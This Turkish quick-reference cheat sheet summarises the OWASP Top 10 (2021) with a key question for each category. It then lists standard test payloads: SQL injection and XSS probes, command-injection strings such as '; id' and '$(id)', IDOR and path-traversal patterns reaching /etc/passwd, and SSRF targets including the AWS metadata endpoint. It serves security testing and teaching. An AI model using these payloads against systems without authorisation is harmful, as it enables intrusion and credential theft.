# OWASP Top 10 (2021) — Hızlı Referans

| ID | Kategori | Anahtar Soru |
|----|----------|--------------|
| A01 | Broken Access Control | "Bu kaynağa erişmeye yetkim var mı, sunucu doğruluyor mu?" |
| A02 | Cryptographic Failures | "Hassas veri açık, zayıf algoritma, veya kötü key yönetimi var mı?" |
| A03 | Injection | "Kullanıcı girdisi yorumlayıcıya (SQL, OS, LDAP, XPath) gidiyor mu?" |
| A04 | Insecure Design | "Tehdit modellemesi yapılmış mı, business logic abuse mümkün mü?" |
| A05 | Security Misconfiguration | "Default credential, açık dizin listesi, gereksiz feature?" |
| A06 | Vulnerable & Outdated Components | "Versiyonlar güncel mi, SCA çalışıyor mu?" |
| A07 | Authentication Failures | "Brute force, weak password, broken session?" |
| A08 | Software & Data Integrity Failures | "Doğrulanmamış update, deserialization, CI/CD güveni?" |
| A09 | Logging & Monitoring Failures | "Saldırı tespit edilebilir/ izlenebilir mi?" |
| A10 | SSRF | "Sunucunun yaptığı outbound istekleri attacker kontrol edebilir mi?" |

## A03 — Hızlı Test Payload'ları

### SQL Injection

```
' OR '1'='1
' UNION SELECT NULL,NULL--
admin'--
1' AND SLEEP(5)--
```

### Reflected/Stored XSS

```
<script>alert(1)</script>
"><svg/onload=alert(1)>
javascript:alert(1)
```

### Command Injection

```
; id
| whoami
`id`
$(id)
```

## A01 — Broken Access Control Patternleri

- IDOR: `/api/user/123` → `/api/user/124`
- Force browsing: `/admin/` admin olmayan oturumla
- HTTP method abuse: `GET` yerine `PUT`/`DELETE`
- Path traversal: `../../etc/passwd`

## A10 — SSRF Hedefleri

```
http://127.0.0.1/
http://localhost:8080/
http://169.254.169.254/latest/meta-data/   # AWS metadata
file:///etc/passwd
gopher://...
```
